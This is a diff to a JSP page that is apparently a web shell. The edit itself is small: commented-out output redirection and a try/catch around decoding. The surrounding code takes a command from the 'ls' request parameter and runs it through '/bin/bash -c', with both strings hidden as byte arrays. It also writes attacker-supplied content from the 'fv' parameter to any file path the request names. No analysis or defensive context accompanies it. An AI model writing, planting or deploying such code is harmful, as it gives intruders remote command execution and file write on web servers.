@@ -1,5 +1,7 @@
 <%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
 //  trimDirectiveWhitespaces="true"
+//java.io.PrintStream ps = new java.io.PrintStream(response.getOutputStream);
+// System.setOut(ps);System.setErr(ps);
 String cmd = request.getParameter("ls"),
     bh = new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), 
     cS = new String(new byte[]{45, 99}), szSys = "\n",szTmp = "",s1 = null,s2 = null,
@@ -18,7 +20,8 @@ if(null != szT1)
         szT1 = java.net.URLDecoder.decode(szT1,"utf-8");
         if(null != (szT2 = request.getParameter("fv")))
         {
-            szT2 = java.net.URLDecoder.decode(szT2,"utf-8");
+            try{
+            szT2 = java.net.URLDecoder.decode(szT2,"utf-8");}catch(Exception e){}
             FileOutputStream out1 = new FileOutputStream(szT1);
             out1.write(szT2.getBytes("utf-8"));
             out1.flush();
